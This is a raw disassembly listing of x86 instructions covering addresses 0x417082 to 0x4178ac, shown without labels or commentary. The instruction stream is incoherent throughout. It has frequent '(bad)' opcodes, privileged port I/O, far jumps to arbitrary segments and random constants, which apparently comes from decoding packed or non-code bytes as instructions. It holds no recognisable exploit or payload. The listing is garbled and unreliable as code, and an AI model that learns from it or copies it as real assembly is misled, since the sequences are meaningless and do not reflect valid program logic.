  417082:	or     BYTE PTR ds:0xbb11619,ch
  417088:	in     al,dx
  417089:	jl     0x417014
  41708b:	fcomip st,st(6)
  41708d:	popa   
  41708e:	cwde   
  41708f:	out    0x21,al
  417091:	xor    BYTE PTR [esi-0x43],cl
  417094:	stc    
  417095:	test   edx,0x86e19dd6
  41709b:	jmp    0x4170d9
  41709d:	cwde   
  41709e:	retf   0x1421
  4170a1:	daa    
  4170a2:	push   eax
  4170a3:	cs mov esp,0xc6df5fb0
  4170a9:	stos   BYTE PTR es:[edi],al
  4170aa:	in     eax,0x3e
  4170ac:	sub    al,0x42
  4170ae:	call   0x6461:0x6bb9f371
  4170b5:	jnp    0x41707f
  4170b7:	pop    eax
  4170b8:	test   eax,0x2da8e6d3
  4170bd:	fisttp WORD PTR [ecx-0x57]
  4170c0:	lahf   
  4170c1:	jecxz  0x41706a
  4170c3:	mov    ebx,0xb2d3ea0b
  4170c8:	mov    ecx,0x2cf2a70c
  4170cd:	lahf   
  4170ce:	and    ecx,ebx
  4170d0:	dec    esp
  4170d1:	xchg   DWORD PTR [esi+0x6f31febd],eax
  4170d7:	push   esi
  4170d8:	sub    al,0xaf
  4170da:	mov    ecx,0x7ef4763b
  4170df:	clc    
  4170e0:	sub    bl,BYTE PTR [eax-0x69efe762]
  4170e6:	sbb    bl,dl
  4170e8:	aaa    
  4170e9:	lea    ebp,[edx+0x6d265b4b]
  4170ef:	inc    eax
  4170f0:	dec    esi
  4170f1:	sub    eax,0xa6daabac
  4170f6:	jns    0x41713c
  4170f8:	add    eax,0xaa0c7774
  4170fd:	jae    0x417137
  4170ff:	cmp    DWORD PTR [ecx+0x1c],0xfffffff6
  417103:	push   eax
  417104:	(bad)  
  417105:	jo     0x417101
  417107:	iret   
  417108:	ds dec ebp
  41710a:	fdiv   QWORD PTR [ecx-0x304e8340]
  417110:	pop    edi
  417111:	ja     0x4170d7
  417113:	imul   eax,DWORD PTR [eax+0x3f48f2e0],0x57
  41711a:	clc    
  41711b:	iret   
  41711c:	or     eax,0x1c5c904c
  417121:	(bad)  [edx+0x2b]
  417124:	ss pop esi
  417126:	pop    edi
  417127:	test   eax,0xd2e555f2
  41712c:	sahf   
  41712d:	loop   0x417118
  41712f:	mov    eax,0xe4d0276
  417134:	addr16 out 0x84,eax
  417137:	clc    
  417138:	into   
  417139:	sub    al,BYTE PTR [edx-0x1c]
  41713c:	cmp    ecx,0x1e5ea97
  417142:	jb     0x417186
  417144:	stc    
  417145:	dec    ebx
  417146:	xchg   esp,eax
  417147:	adc    al,0x69
  417149:	xor    al,0x4e
  41714b:	pop    ss
  41714c:	imul   edx,esi,0x7a
  41714f:	inc    esp
  417150:	icebp  
  417151:	test   DWORD PTR [edx],ecx
  417153:	dec    ebp
  417154:	push   edx
  417155:	xlat   BYTE PTR ds:[ebx]
  417156:	fild   WORD PTR [ebp+0x6894ff10]
  41715c:	mov    al,ds:0x1269fa81
  417161:	push   ebx
  417162:	mov    ebx,0xace84290
  417167:	push   esp
  417168:	repz xchg esi,eax
  41716a:	mov    al,0x59
  41716c:	and    DWORD PTR [ebx],ecx
  41716e:	adc    edx,DWORD PTR [eax+0x3a]
  417171:	cmp    esp,esi
  417173:	jge    0x4170f7
  417175:	(bad)  
  417176:	je     0x41712b
  417178:	stos   DWORD PTR es:[edi],eax
  417179:	dec    ecx
  41717a:	popa   
  41717b:	or     esp,DWORD PTR [edi+ebp*4-0x2179a3e6]
  417182:	dec    ebx
  417183:	jmp    0xa131:0x59345c76
  41718a:	sub    al,0xbc
  41718c:	inc    ecx
  41718d:	popa   
  41718e:	shr    DWORD PTR [edi+edi*2],0x6f
  417192:	or     DWORD PTR [ebp+0x47],ecx
  417195:	in     eax,0xaa
  417197:	loop   0x417186
  417199:	dec    edx
  41719a:	mov    eax,0x2ee325cd
  41719f:	pop    es
  4171a0:	push   esp
  4171a1:	mov    ah,0xc1
  4171a3:	pop    es
  4171a4:	enter  0x26c,0xee
  4171a8:	xchg   BYTE PTR [ebx-0x52b2827b],dh
  4171ae:	mov    ebx,0x5d5c654e
  4171b3:	adc    al,ch
  4171b5:	mov    ds:0x3af82db8,al
  4171ba:	sub    al,0x9a
  4171bc:	nop
  4171bd:	mov    ds:0x44a1eaa4,eax
  4171c2:	push   ecx
  4171c3:	pop    esp
  4171c4:	cmp    eax,0x2f2e41fd
  4171c9:	jl     0x4171a9
  4171cb:	or     ecx,DWORD PTR [ebp+0x6a]
  4171ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4171cf:	outs   dx,BYTE PTR ds:[esi]
  4171d0:	mov    esi,0x9e82f03d
  4171d5:	idiv   BYTE PTR [ecx+edx*8+0x50e51c45]
  4171dc:	cmp    eax,0x85b3b7be
  4171e1:	mov    bh,0xaa
  4171e3:	psubusw mm0,QWORD PTR [esi]
  4171e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4171e7:	fucomp st(7)
  4171e9:	mov    ah,BYTE PTR [eax+0x7bbcc640]
  4171ef:	adc    ah,BYTE PTR [esi-0x24f8e8e6]
  4171f5:	dec    ecx
  4171f6:	fdivr  st,st(7)
  4171f8:	mov    edi,0xb5d45049
  4171fd:	fmul   DWORD PTR [ebp-0x49]
  417200:	jp     0x417209
  417202:	(bad)  
  417203:	(bad)  
  417204:	in     al,0x11
  417206:	addr16 inc edi
  417208:	retf   
  417209:	dec    esi
  41720a:	push   0x6f49bf4c
  41720f:	nop
  417210:	xchg   esp,eax
  417211:	retf   
  417212:	add    bh,bh
  417214:	cwde   
  417215:	or     BYTE PTR [ebp+0x43],0xf
  417219:	ror    DWORD PTR [esi+0x7a],1
  41721c:	int3   
  41721d:	(bad)  
  41721e:	outs   dx,DWORD PTR ds:[esi]
  41721f:	jae    0x417292
  417221:	imul   ebp,edi,0xffffffbf
  417224:	fisttp WORD PTR [ecx]
  417226:	jns    0x417229
  417228:	mov    edi,0x404091d2
  41722d:	stc    
  41722e:	aaa    
  41722f:	pop    ss
  417230:	call   0x4ebb4bbd
  417235:	and    edi,0x594dc49
  41723b:	sahf   
  41723c:	imul   ebp,DWORD PTR [ecx+edx*4],0x3e
  417240:	rcl    bl,0x7d
  417243:	xchg   edx,eax
  417244:	cmp    al,0x0
  417246:	je     0x417264
  417248:	cmp    al,0x15
  41724a:	scas   eax,DWORD PTR es:[edi]
  41724b:	and    cl,al
  41724d:	daa    
  41724e:	sbb    DWORD PTR [ecx+edi*4+0x19],edi
  417252:	or     edx,ebp
  417254:	and    al,0xe4
  417256:	sbb    ebp,DWORD PTR [esi+0x45]
  417259:	jl     0x4172c6
  41725b:	cmp    BYTE PTR [edi],ah
  41725d:	sahf   
  41725e:	pop    edi
  41725f:	idiv   BYTE PTR [ecx+0x71cfb1bd]
  417265:	fnsave [esi-0x50962258]
  41726b:	inc    eax
  41726c:	sbb    esi,DWORD PTR [ebx]
  41726e:	mov    esp,0x9a391497
  417273:	mov    db1,ebx
  417276:	ds test al,0xdf
  417279:	stc    
  41727a:	int3   
  41727b:	neg    bl
  41727d:	mov    ah,0xe5
  41727f:	push   edi
  417280:	sub    DWORD PTR [edx+0x440ec62b],esi
  417286:	(bad)  
  417287:	imul   BYTE PTR [ecx+0x5a]
  41728a:	xchg   ebp,eax
  41728b:	sub    al,0x13
  41728d:	lods   eax,DWORD PTR ds:[esi]
  41728e:	cmp    BYTE PTR [ecx],ah
  417290:	ds loopne 0x41723a
  417293:	jmp    0x417314
  417295:	push   0x9fe0068c
  41729a:	push   0xffffffbf
  41729c:	test   eax,0xb430a540
  4172a1:	arpl   WORD PTR [edi],dx
  4172a3:	xchg   DWORD PTR [eax-0x724e19f8],ebp
  4172a9:	mov    eax,ds:0x5b6b6140
  4172ae:	test   DWORD PTR [esi+0x3b80aec5],ebx
  4172b4:	arpl   di,bx
  4172b6:	mov    bh,0x7f
  4172b8:	imul   ebx,DWORD PTR [eax+eax*4-0x8],0x71
  4172bd:	fdivr  st,st(3)
  4172bf:	call   0xcb2a:0xc708f510
  4172c6:	ds pop ebx
  4172c8:	mov    ds:0x37dad227,al
  4172cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4172ce:	pavgw  mm6,QWORD PTR [ebx-0x24769b69]
  4172d5:	mov    gs,edx
  4172d7:	mov    edx,0x445b46f0
  4172dc:	pushf  
  4172dd:	dec    ebx
  4172de:	sub    al,0x94
  4172e0:	pop    edi
  4172e1:	xchg   esp,eax
  4172e2:	pop    ecx
  4172e3:	jb     0x4172f2
  4172e5:	or     edx,ecx
  4172e7:	add    cl,0x7d
  4172ea:	xlat   BYTE PTR ds:[ebx]
  4172eb:	adc    ebp,DWORD PTR [esp+esi*1+0x44712094]
  4172f2:	push   ss
  4172f3:	inc    ebx
  4172f4:	(bad)  
  4172f5:	mov    ah,0xf3
  4172f7:	xor    ebp,edi
  4172f9:	pop    ds
  4172fa:	sbb    BYTE PTR [esi-0x2eb1f01d],0xb8
  417301:	out    dx,eax
  417302:	pop    ebp
  417303:	push   cs
  417304:	imul   edx,edi,0xb72d16f
  41730a:	in     al,0xc0
  41730c:	shl    BYTE PTR [edi+eax*2-0x4b],cl
  417310:	add    eax,eax
  417312:	retf   
  417313:	mov    BYTE PTR [edx+0x40e5c184],cl
  417319:	ffree  st(4)
  41731b:	sub    edx,DWORD PTR [esi-0x6c]
  41731e:	and    DWORD PTR [edi+0x63336bc7],edi
  417324:	fidivr WORD PTR ds:0xae0faa9d
  41732a:	aad    0xfa
  41732c:	scas   eax,DWORD PTR es:[edi]
  41732d:	repz and bh,bh
  417330:	stc    
  417331:	loop   0x4172f3
  417333:	in     eax,0x2d
  417335:	jmp    0x17db:0x6aa89fad
  41733c:	iret   
  41733d:	push   ebp
  41733e:	add    eax,0xe04b267d
  417343:	test   DWORD PTR [edx-0x23],ebx
  417346:	xchg   ebx,eax
  417347:	xor    ebp,DWORD PTR [ebp+0x7f]
  41734a:	push   es
  41734b:	xchg   edx,eax
  41734c:	dec    esi
  41734d:	(bad)  
  41734e:	pop    ebx
  41734f:	jno    0x41737c
  417351:	push   eax
  417352:	mov    WORD PTR ds:0x653474b4,gs
  417358:	or     DWORD PTR [ecx],ecx
  41735a:	sar    dh,cl
  41735c:	mov    ch,0x48
  41735e:	mov    bl,0x1c
  417360:	bound  ebx,QWORD PTR [edx+ebp*2-0x2b70ca3c]
  417367:	inc    esi
  417368:	mov    dl,0x19
  41736a:	retf   
  41736b:	ins    DWORD PTR es:[edi],dx
  41736c:	lock js 0x4173dd
  41736f:	inc    edx
  417370:	into   
  417371:	pop    esi
  417372:	push   edx
  417373:	(bad)  
  417374:	mov    edx,0x6ca677a5
  417379:	lea    ebp,fs:[ecx-0x53]
  41737d:	stos   DWORD PTR es:[edi],eax
  41737e:	not    al
  417380:	cmp    esp,esi
  417382:	adc    ch,BYTE PTR [eax+edi*8-0x5]
  417386:	pop    esp
  417387:	out    0xd3,al
  417389:	enter  0xe13f,0xbc
  41738d:	cmp    DWORD PTR [esi-0x78c8fb86],esi
  417393:	inc    eax
  417394:	fucom  st(2)
  417396:	stos   BYTE PTR es:[edi],al
  417397:	push   eax
  417398:	dec    edi
  417399:	ret    0xe400
  41739c:	mov    ecx,0xec71f56b
  4173a1:	xchg   DWORD PTR ds:[ecx],edx
  4173a4:	xchg   esi,eax
  4173a5:	and    ecx,esp
  4173a7:	jmp    0xf1df29fd
  4173ac:	adc    BYTE PTR [edx],ch
  4173ae:	mov    BYTE PTR [ecx+0x649a8045],cl
  4173b4:	jmp    0x9918:0xfdad08a3
  4173bb:	push   esi
  4173bc:	jle    0x417385
  4173be:	cmp    eax,0x219febcb
  4173c3:	jecxz  0x41741f
  4173c5:	cli    
  4173c6:	leave  
  4173c7:	jg     0x417374
  4173c9:	in     eax,dx
  4173ca:	push   0xffffffa5
  4173cc:	out    0x44,al
  4173ce:	and    eax,0x1bae2d1b
  4173d3:	add    ah,BYTE PTR [ebx]
  4173d5:	xchg   ebp,eax
  4173d6:	fldcw  WORD PTR ds:0xe4b2be9
  4173dc:	pop    ebp
  4173dd:	pop    esi
  4173de:	mov    esp,0x62f77499
  4173e3:	or     ah,BYTE PTR [ecx]
  4173e5:	mov    eax,ds:0xa18057e7
  4173ea:	ret    0xd41
  4173ed:	xchg   ebp,eax
  4173ee:	add    al,0xfe
  4173f0:	dec    ebp
  4173f1:	ss jb  0x417461
  4173f4:	xor    esi,DWORD PTR [esi]
  4173f6:	fs inc ecx
  4173f8:	cs retf 0x7c23
  4173fc:	dec    ebp
  4173fd:	(bad)  
  4173fe:	loope  0x41742f
  417400:	aaa    
  417401:	lods   al,BYTE PTR ds:[esi]
  417402:	int    0x6e
  417404:	xchg   cl,ch
  417406:	ins    BYTE PTR es:[edi],dx
  417407:	jnp    0x4173f0
  417409:	push   0xffffffcf
  41740b:	popf   
  41740c:	sbb    BYTE PTR [edx],ah
  41740e:	sub    BYTE PTR [edi-0x3ba13865],dl
  417414:	mov    bh,BYTE PTR [ebx]
  417416:	call   DWORD PTR [esi+edx*8+0x4b9cb0aa]
  41741d:	add    ch,ch
  41741f:	add    cl,ch
  417421:	retf   
  417422:	shr    al,1
  417424:	je     0x4173e0
  417426:	hlt    
  417427:	fcomp  QWORD PTR [ebx+eax*4]
  41742a:	ins    BYTE PTR es:[edi],dx
  41742b:	sub    eax,0xa1db4f16
  417430:	fnstsw WORD PTR [edx+0x14]
  417433:	int    0x9a
  417435:	push   ebx
  417436:	cwde   
  417437:	and    esi,DWORD PTR [esi-0x32]
  41743a:	div    DWORD PTR [edx-0x337430a0]
  417440:	inc    edi
  417441:	cmp    esp,edx
  417443:	sub    ax,0xe357
  417447:	mov    esp,0x8004da6c
  41744c:	adc    ah,al
  41744e:	inc    edi
  41744f:	mov    ebp,DWORD PTR [edx-0x7]
  417452:	fs js  0x417484
  417455:	mov    esp,0x99bf2af2
  41745a:	sbb    ebp,esp
  41745c:	cmp    al,al
  41745e:	adc    edi,DWORD PTR [ebx+eiz*1+0x11]
  417462:	(bad)  
  417464:	ror    cl,cl
  417466:	xchg   esp,eax
  417467:	fidiv  DWORD PTR [eax+0x42]
  41746a:	(bad)
  41746d:	add    DWORD PTR [edi-0x18],esp
  417470:	jl     0x41743f
  417472:	push   esp
  417473:	out    dx,eax
  417474:	dec    edi
  417475:	mov    bh,0xa9
  417477:	test   al,0xe7
  417479:	jmp    0x4683b7f8
  41747e:	(bad)  
  417480:	into   
  417481:	mov    dl,0xfd
  417483:	mov    ebp,0x6aa1020c
  417488:	scas   al,BYTE PTR es:[edi]
  417489:	xchg   ebp,eax
  41748a:	or     esp,DWORD PTR [eax]
  41748c:	mov    bh,0xa8
  41748e:	lock inc ecx
  417490:	dec    ebx
  417491:	gs sub al,bl
  417494:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417495:	aad    0xc6
  417497:	inc    ecx
  417498:	and    BYTE PTR [edi-0x1a43eeae],cl
  41749e:	pop    edx
  41749f:	test   BYTE PTR [edx+edx*2],dl
  4174a2:	sbb    DWORD PTR [ebx+0x64],esp
  4174a5:	stc    
  4174a6:	sbb    al,0xdb
  4174a8:	fild   QWORD PTR [eax]
  4174aa:	cmp    DWORD PTR [esi],esi
  4174ac:	and    cl,BYTE PTR [ecx-0x71]
  4174af:	mov    BYTE PTR [esi+edx*2-0x3f],bh
  4174b3:	push   cs
  4174b4:	fs jg  0x417458
  4174b7:	pop    ss
  4174b8:	outs   dx,BYTE PTR ds:[esi]
  4174b9:	fcom   DWORD PTR [edx]
  4174bb:	jno    0x4174f1
  4174bd:	shl    BYTE PTR [edx-0x2c],0xbe
  4174c1:	test   BYTE PTR [ecx],dh
  4174c3:	data16 scas al,BYTE PTR es:[edi]
  4174c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4174c6:	sbb    eax,0xcaaf1167
  4174cb:	inc    eax
  4174cc:	xor    esi,DWORD PTR [edx+edi*1-0xa]
  4174d0:	xchg   edi,eax
  4174d1:	loop   0x41751c
  4174d3:	lods   al,BYTE PTR ds:[esi]
  4174d4:	push   esp
  4174d5:	stos   BYTE PTR es:[edi],al
  4174d6:	and    al,0x98
  4174d8:	push   edi
  4174d9:	out    dx,eax
  4174da:	and    ecx,DWORD PTR [ebp+0x5d5b9487]
  4174e0:	ss push 0xffffffc2
  4174e3:	push   esp
  4174e4:	loop   0x41752f
  4174e6:	test   al,0xb1
  4174e8:	sub    BYTE PTR [ebp+0x1eb9b55c],ch
  4174ee:	pop    ebx
  4174ef:	aam    0x5e
  4174f1:	and    eax,0x62e5fda8
  4174f6:	in     eax,dx
  4174f7:	or     DWORD PTR [edx+edi*1],0x0
  4174fb:	(bad)  
  4174fc:	js     0x417536
  4174fe:	imul   eax,DWORD PTR [ebx],0xffffffa8
  417501:	aas    
  417502:	jmp    0x59532385
  417507:	repz mov ds:0xb380ef27,eax
  41750d:	fisttp DWORD PTR [eax+0x11c77555]
  417513:	dec    ebp
  417514:	adc    al,0x9b
  417516:	jle    0x417530
  417518:	rcr    bl,cl
  41751a:	outs   dx,DWORD PTR ds:[esi]
  41751b:	adc    eax,DWORD PTR [eax-0x1f6ad4d4]
  417521:	rcl    BYTE PTR [edi],0xf5
  417524:	push   es
  417525:	and    BYTE PTR [ecx+0x18e2875],cl
  41752b:	add    BYTE PTR [ecx-0x5f],dl
  41752e:	xchg   ecx,eax
  41752f:	out    dx,eax
  417530:	mov    bh,0x21
  417532:	adc    BYTE PTR [edx],0xc7
  417535:	mov    ds:0xef177cbe,eax
  41753a:	push   ecx
  41753b:	ds sbb eax,0xb5f4bf41
  417541:	dec    esp
  417542:	push   edx
  417543:	or     ebp,esi
  417545:	push   edx
  417546:	mov    DWORD PTR [ecx-0x56138f37],ebp
  41754c:	sbb    al,0xc0
  41754e:	adc    esp,ecx
  417550:	and    DWORD PTR [esi+0x1e686dfc],ebp
  417556:	mov    bh,0x5
  417558:	sub    al,0xa3
  41755a:	mov    bh,0xed
  41755c:	adc    bl,0x66
  41755f:	dec    esp
  417560:	mov    dl,0x75
  417562:	jge    0x417539
  417564:	cmp    BYTE PTR [edi-0x425fea86],dh
  41756a:	mov    eax,0x5b4b1c6d
  41756f:	ins    DWORD PTR es:[edi],dx
  417570:	mov    bh,0x88
  417572:	test   al,0xf6
  417574:	ja     0x41756b
  417576:	sbb    al,0xdc
  417578:	sbb    bh,BYTE PTR [edx+0x23]
  41757b:	add    esi,edx
  41757d:	mov    BYTE PTR [edi-0x14],0xfe
  417581:	push   edx
  417582:	mov    ebx,fs
  417584:	mov    ah,0xeb
  417586:	dec    esp
  417587:	mov    bh,0xa6
  417589:	sbb    ah,BYTE PTR [edi]
  41758b:	repnz shl DWORD PTR [ebp+0x6f39370d],cl
  417592:	inc    eax
  417593:	or     BYTE PTR [esi+0x57ec2c4e],ah
  417599:	jmp    0x18ca36d5
  41759e:	pop    ebp
  41759f:	push   edx
  4175a0:	cmp    DWORD PTR [ecx+edx*8-0x467d86e],edx
  4175a7:	dec    ecx
  4175a8:	pop    esi
  4175a9:	rcr    BYTE PTR [eax],0xd3
  4175ac:	(bad)  
  4175ae:	sbb    ebx,0x9cf559bf
  4175b4:	sub    al,0xe8
  4175b6:	and    ebp,edx
  4175b8:	retf   0xc12
  4175bb:	ror    BYTE PTR [esi+edx*2+0x1f278c8],cl
  4175c2:	push   ebp
  4175c3:	push   es
  4175c4:	ja     0x417567
  4175c6:	mov    esi,0x6b80d27e
  4175cb:	retf   0x6dd8
  4175ce:	ja     0x41762d
  4175d0:	or     al,0x85
  4175d2:	test   al,0x47
  4175d4:	pop    esi
  4175d5:	sbb    edx,edi
  4175d7:	in     al,0xc6
  4175d9:	xchg   DWORD PTR [ebp-0x66eeb3a8],esi
  4175df:	xor    bl,BYTE PTR [edi+0x46e1a221]
  4175e5:	mov    al,ds:0x425d72fb
  4175ea:	cmp    al,0xe1
  4175ec:	fcmovb st,st(6)
  4175ee:	mov    dl,0x85
  4175f0:	outs   dx,BYTE PTR ds:[esi]
  4175f1:	inc    edi
  4175f2:	std    
  4175f3:	push   cs
  4175f4:	inc    esp
  4175f5:	push   ebp
  4175f6:	sbb    DWORD PTR [ecx],ebp
  4175f8:	fidiv  WORD PTR [ebp+ebx*8+0x73a176a9]
  4175ff:	add    eax,0x12b0706c
  417604:	or     eax,DWORD PTR [eax-0x466eee58]
  41760a:	mov    al,ds:0xea2f27ed
  41760f:	xchg   ecx,eax
  417610:	imul   edi,edx,0xa39ee746
  417616:	cmp    eax,0xba45abfc
  41761b:	in     eax,0xf7
  41761d:	jae    0x417646
  41761f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417620:	out    0x32,al
  417622:	fsubr  DWORD PTR cs:[ebx+0x38932353]
  417629:	xor    edx,0xa2b8198c
  41762f:	scas   al,BYTE PTR es:[edi]
  417630:	mov    eax,0xa815e23b
  417635:	sbb    ah,BYTE PTR [edx+0x585ea115]
  41763b:	retf   0xdd7d
  41763e:	xchg   ebp,eax
  41763f:	lea    esp,[edi+eiz*1]
  417642:	(bad)  
  417643:	neg    BYTE PTR [ebp-0x6f41f38a]
  417649:	lds    ecx,FWORD PTR [edi-0x408bb3b]
  41764f:	inc    esp
  417650:	dec    eax
  417651:	arpl   WORD PTR [esi+0x30],ax
  417654:	push   0x55
  417656:	and    al,0xa4
  417658:	cs test al,0x1c
  41765b:	inc    edi
  41765c:	jge    0x41765c
  41765e:	jb     0x417601
  417660:	ins    DWORD PTR es:[edi],dx
  417661:	pop    ebx
  417662:	scas   eax,DWORD PTR es:[edi]
  417663:	xor    DWORD PTR [esi+edi*4],ebx
  417666:	push   esi
  417667:	mov    esi,esi
  417669:	scas   al,BYTE PTR es:[edi]
  41766a:	jne    0x417629
  41766c:	retf   
  41766d:	loopne 0x4176d1
  41766f:	int3   
  417670:	cmp    ecx,DWORD PTR [ecx]
  417672:	jae    0x41764d
  417674:	mov    DWORD PTR [ecx+0x65],esp
  417677:	gs in  al,0x18
  41767a:	rcl    DWORD PTR [ebx],1
  41767c:	cwde   
  41767d:	mov    DWORD PTR [edi+ecx*8],ebx
  417680:	aam    0xe5
  417682:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417683:	out    0x27,al
  417685:	add    bl,BYTE PTR [edx]
  417687:	jne    0x41760c
  417689:	xor    BYTE PTR [ecx+0x4f2a8a05],cl
  41768f:	jge    0x41766d
  417691:	(bad)  
  417692:	ror    ch,cl
  417694:	lock jmp 0xc5876e79
  41769a:	mov    dh,0xb4
  41769c:	or     eax,0xee714c6
  4176a1:	pushf  
  4176a2:	pop    esi
  4176a3:	das    
  4176a4:	repnz mov WORD PTR ds:0x3e780543,ds
  4176ac:	add    edi,DWORD PTR [ecx+0x6fefbb26]
  4176b2:	sub    eax,0x2bc33e29
  4176b7:	fld    st(2)
  4176b9:	into   
  4176ba:	scas   al,BYTE PTR es:[edi]
  4176bb:	or     bh,bh
  4176bd:	popa   
  4176be:	in     al,0x11
  4176c0:	in     eax,dx
  4176c1:	fdivr  QWORD PTR [esi-0x7b]
  4176c4:	adc    esp,ebx
  4176c6:	adc    al,0x50
  4176c8:	call   0x95df5e11
  4176cd:	jmp    0x438f9558
  4176d2:	call   0xfb1c1517
  4176d7:	mov    edx,0x7d0b8236
  4176dc:	or     ch,0xfc
  4176df:	dec    esi
  4176e0:	inc    esp
  4176e1:	jp     0x417758
  4176e3:	rcl    eax,cl
  4176e5:	(bad)  
  4176e7:	adc    bh,cl
  4176e9:	loope  0x417720
  4176eb:	mov    ds:0xd05d5301,al
  4176f0:	out    0x99,al
  4176f2:	std    
  4176f3:	fsin   
  4176f5:	retf   0xfb20
  4176f8:	mov    esp,0xd97d8ce5
  4176fd:	mov    cl,0x4b
  4176ff:	xor    eax,0xad02fd68
  417704:	shr    DWORD PTR [edx+0x28],cl
  417707:	call   0xcbb0b29e
  41770c:	xchg   esp,eax
  41770d:	pop    ecx
  41770e:	add    ch,BYTE PTR [edi+0x65031d9b]
  417714:	push   0xffffffba
  417716:	outs   dx,DWORD PTR ds:[esi]
  417717:	ja     0x417759
  417719:	aaa    
  41771a:	loop   0x41777c
  41771c:	push   eax
  41771d:	dec    ecx
  41771e:	scas   eax,DWORD PTR es:[edi]
  41771f:	outs   dx,BYTE PTR ds:[esi]
  417720:	dec    eax
  417721:	sbb    eax,ebp
  417723:	adc    eax,0x1f3e754d
  417728:	test   al,0xf7
  41772a:	add    DWORD PTR [eax+0x2844e5f0],ebp
  417730:	bnd jp 0x4176e0
  417733:	loope  0x4176b8
  417735:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417736:	call   0x2119:0xc2cb8613
  41773d:	cmp    eax,0xe8cc559b
  417742:	xor    esp,0x28
  417745:	aaa    
  417746:	push   esi
  417747:	cwde   
  417748:	mov    ecx,edi
  41774a:	push   ss
  41774b:	dec    eax
  41774c:	xchg   edi,eax
  41774d:	inc    edx
  41774e:	dec    eax
  41774f:	mov    ds:0x3906a40e,eax
  417754:	xor    al,0x45
  417756:	jge    0x4176e2
  417758:	test   al,0x6
  41775a:	sub    ebx,DWORD PTR [ecx+edx*4-0x2d]
  41775e:	fmul   st(0),st
  417760:	xchg   esp,eax
  417761:	iret   
  417762:	dec    eax
  417763:	aaa    
  417764:	test   al,0x48
  417766:	jecxz  0x4177d1
  417768:	jmp    0xd1da:0x33decad2
  41776f:	xchg   esi,eax
  417770:	xchg   ebx,eax
  417771:	(bad)  
  417772:	xor    eax,DWORD PTR [edi]
  417774:	xor    eax,0x4e97ffe5
  417779:	mov    ds:0xe060b386,eax
  41777e:	dec    ebx
  41777f:	loope  0x41777f
  417781:	int3   
  417782:	js     0x41776a
  417784:	mov    ebp,0x3d2748e2
  417789:	and    DWORD PTR [edx+0x5],ebp
  41778c:	mov    al,0x20
  41778e:	popf   
  41778f:	pop    edi
  417790:	int3   
  417791:	mov    edi,?
  417793:	sbb    ecx,DWORD PTR [eax+ecx*2+0x195d9fad]
  41779a:	(bad)  
  41779c:	adc    eax,0xac75aa17
  4177a1:	mov    WORD PTR [esi+0xd7bb769],ss
  4177a7:	and    eax,0xa31cf2d5
  4177ac:	adc    eax,0x485c5d54
  4177b1:	jne    0x41776a
  4177b3:	dec    ebx
  4177b4:	test   bh,ch
  4177b6:	xchg   ebp,eax
  4177b7:	mov    al,0x21
  4177b9:	jmp    0x59a00054
  4177be:	in     eax,dx
  4177bf:	xchg   edi,eax
  4177c0:	ds ret 0x9b75
  4177c4:	push   0x5bc1c277
  4177c9:	sbb    bh,al
  4177cb:	push   ebp
  4177cc:	push   ecx
  4177cd:	jmp    0x4177dc
  4177cf:	or     cl,BYTE PTR [ecx-0x7be99408]
  4177d5:	clc    
  4177d6:	cmp    al,0x39
  4177d8:	nop
  4177d9:	in     al,dx
  4177da:	(bad)  
  4177db:	mov    eax,ds:0x141cddb9
  4177e0:	sub    BYTE PTR [ebp+ecx*8-0x6cb6d66c],ch
  4177e7:	mov    dl,BYTE PTR [ecx]
  4177e9:	xchg   ebp,eax
  4177ea:	shr    BYTE PTR [edi+ecx*8-0x745a172b],0xfc
  4177f2:	or     al,0x47
  4177f4:	call   0xa295:0x5ed4153e
  4177fb:	mov    edi,0x6968748a
  417800:	jo     0x4177f7
  417802:	jmp    0x417845
  417804:	push   ecx
  417805:	pop    eax
  417806:	fst    DWORD PTR [ebp-0x71]
  417809:	sub    ch,BYTE PTR [ebp-0x6e2c3a33]
  41780f:	outs   dx,DWORD PTR ds:[esi]
  417810:	icebp  
  417811:	xor    dh,al
  417813:	shr    BYTE PTR [edx-0x61492e97],1
  417819:	or     BYTE PTR [ebx+0x706002ed],bh
  41781f:	inc    ecx
  417820:	dec    eax
  417821:	in     eax,dx
  417822:	or     eax,0x6cea00c3
  417827:	xchg   DWORD PTR [edx],edx
  417829:	dec    ecx
  41782a:	not    DWORD PTR [ebx]
  41782c:	mov    eax,DWORD PTR [ecx+0x3f]
  41782f:	adc    al,0x8
  417831:	hlt    
  417832:	div    DWORD PTR [ebp+0x6548de61]
  417838:	or     al,0x35
  41783a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41783b:	inc    eax
  41783c:	xor    eax,0xa455f378
  417841:	out    0x3c,al
  417843:	mov    cl,0x8c
  417845:	inc    esp
  417846:	adc    eax,0x7d43a8b8
  41784b:	mov    ch,0x40
  41784d:	or     al,0xbc
  41784f:	into   
  417850:	fmul   DWORD PTR [edx+0x65d3f53c]
  417856:	push   0xffffffe3
  417858:	xchg   ebp,eax
  417859:	dec    ebx
  41785a:	sbb    bl,al
  41785c:	add    ecx,DWORD PTR [ecx-0x6a365cc6]
  417862:	dec    edx
  417863:	xor    eax,0x3cff460a
  417868:	test   al,0xc5
  41786a:	pop    eax
  41786b:	jb     0x41783d
  41786d:	inc    ebp
  41786e:	mov    ds:0xcbda1ff3,eax
  417873:	sub    al,0x8c
  417875:	sbb    BYTE PTR [ecx+ebx*2],cl
  417878:	dec    ebp
  417879:	pop    ebp
  41787a:	mov    ebp,0x8a2d403
  41787f:	jg     0x417844
  417881:	xchg   BYTE PTR [ebp-0x2],dh
  417884:	jg     0x41785c
  417886:	pushf  
  417887:	push   0x758a02a2
  41788c:	jmp    0x417894
  41788e:	mov    ch,0x35
  417890:	sub    ebx,ebx
  417892:	retf   
  417893:	mov    edx,0x4366fb70
  417898:	and    BYTE PTR [ecx+edx*1-0x44],bl
  41789c:	repz push es
  41789e:	dec    eax
  41789f:	mov    eax,ds:0xcff8c619
  4178a4:	push   0x9
  4178a6:	hlt    
  4178a7:	pop    ecx
  4178a8:	int    0x88
  4178aa:	int3   
  4178ab:	outs   dx,BYTE PTR ds:[esi]
  4178ac:	mov    cl,0x17
